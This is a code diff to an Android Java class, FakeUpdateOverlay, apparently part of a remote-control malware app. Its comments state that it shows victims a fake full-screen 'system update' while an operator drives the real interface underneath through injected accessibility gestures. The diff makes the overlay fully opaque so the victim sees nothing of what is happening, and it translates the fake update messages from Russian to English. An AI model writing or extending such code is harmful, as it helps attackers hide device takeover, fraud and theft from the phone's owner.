@@ -20,23 +20,25 @@ import com.fason.app.R;
 import com.fason.app.core.FasonApp;
 
 /**
- * Full-screen fake "system update" overlay.
+ * Full-screen opaque fake "system update" overlay.
  *
  * Drawn above every app so the device user sees an update screen while the
  * operator keeps working on the real UI underneath. The window is
  * FLAG_NOT_TOUCHABLE, so accessibility-injected gestures (InputInjector) and
- * physical touches fall through to the window below.
+ * physical touches fall through to the window below. Alpha is 1.0 by default,
+ * so nothing of the real UI is visible on the device.
  */
 public final class FakeUpdateOverlay {
     private static final String TAG = "FakeUpdateOverlay";
     private static final long TICK_MS = 400;
+    private static final float DEFAULT_ALPHA = 1f;
 
     private static final String[] STAGES = {
-        "Подготовка к обновлению…",
-        "Проверка целостности пакетов…",
-        "Оптимизация приложений…",
-        "Установка обновления…",
-        "Финализация…",
+        "Preparing update…",
+        "Verifying package integrity…",
+        "Optimizing apps…",
+        "Installing update…",
+        "Finalizing…",
     };
 
     private static volatile FakeUpdateOverlay instance;
@@ -49,7 +51,7 @@ public final class FakeUpdateOverlay {
     private TextView percentView;
     private TextView stageView;
     private boolean visible;
-    private float alpha = 1f;
+    private float alpha = DEFAULT_ALPHA;
     private int progress;
     private long startedAt;
 
@@ -99,6 +101,8 @@ public final class FakeUpdateOverlay {
     public boolean isVisible() { return visible; }
     public float getAlpha() { return alpha; }
 
+    public void show() { show(DEFAULT_ALPHA); }
+
     public void show(float startAlpha) { main.post(() -> showInternal(startAlpha)); }
     public void hide() { main.post(this::hideInternal); }
     public void setAlpha(float a) { main.post(() -> setAlphaInternal(a)); }
@@ -133,8 +137,9 @@ public final class FakeUpdateOverlay {
                     | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                     | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                     | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
-                PixelFormat.TRANSLUCENT);
+                PixelFormat.OPAQUE);
             lp.gravity = Gravity.TOP | Gravity.START;
+            lp.alpha = 1f;
 
             wm.addView(root, lp);
 
